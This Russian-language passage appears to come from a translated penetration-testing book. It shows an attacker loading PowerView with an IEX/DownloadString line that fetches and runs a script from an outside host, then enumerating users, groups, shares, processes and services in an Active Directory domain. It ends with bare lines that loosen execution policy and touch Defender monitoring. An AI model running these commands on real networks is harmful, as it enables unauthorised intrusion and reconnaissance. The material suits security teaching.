# Загружаем сценарий PowerView

Наше первое действие в этом новом окне PowerShell без ограничений состоит в создании объекта веб-клиента браузера для выборки сценария PowerView из Интернета:
$browser = New-Object System.Net.WebClient;
		
В Главе 5 эта команда завершалась неудачей, но на этот раз мы не получаем никаких ошибок. Затем мы инструктируем этот объект браузера воспользоваться полномочиями по умолчанию имеющегося прокси системного уровня, также как и в случае с исходящим обменом HTTP, протекающим через аутентифицированный прокси для достижения Интернета:
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;
		
Наконец, мы выгружаем в память и исполняем свой сценарий PowertView. Это последняя строка является сочетанием Invoke-Expression (IEX) и DownloadString, которые выгружают и загружают данный сценарий:
IEX($browser.DownloadString('https://sf-res.com/miniview.ps1'));

# Gathering Data

Начнём с пачки сведений обо всех пользователях через команду PowerShell Get-NetUser:
Get-NetUser | select name, lastlogontimestamp, serviceprincipalname, admincount, memberof | Format-Table -Wrap -AutoSize | out-file users.txt

Мы продолжим выборкой перечислений групп и участия в них:
Get-NetGroup -FullData | select name, description | Format-Table -Wrap -AutoSize | out-file groups.txt
Get-NetGroup | Get-NetGroupMember -FullData | ForEach-Object -Process { "$($_.GroupName), $($_.MemberName), $($_.description)"} | out-file group_members.txt
	
Также мы выполняем выборку GPO, которые характеризуют этот домен, например, установленную политику аудита, политику пароля, настройки безопасности и тому подобное - короче говоря, все биты настроенной командой ИТ конфигурации. Это поможет нам получить некое понимание имеющих место политик безопасности. Для этого мы воспользуемся встроенной командой Windows gpresult, которая оформит нам аккуратно форматированный отчёт HTML:
gpresult -h gpo.html
		
Наш следующий этап состоит в выводе перечня доступных совместных сетевых ресурсов посредством команды Invoke-ShareFinder и сохраняем их в shares.txt:
Invoke-ShareFinder | out-file shares.txt			

Get-Process | Select-Object id, name, username, path | Format-Table -Wrap -AutoSize | out-file processes.txt
		
Далее мы выполняем выборку перечня запущенных служб, зондируя имеющийся класс win32_service через Windows Management Instrumentation (WMI) и 
сохраняя его в services.txt. WMI это просто ещё один способ выставления внутренних компонентов Windows и взаимодействия с ними. 
Порой проще выполнять выборку атрибутов определённых объектов через WMI, нежели через естественные исполняемые файлы Windows, как в данной ситуации:
Get-WmiObject win32_service -filter "state='running'" | select name,processid,pathname | Format-Table -Wrap -AutoSize | out-file services.txt

Get-ExecutionPolicy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
Set-MpPreference -DisableRealtimeMonitoring $False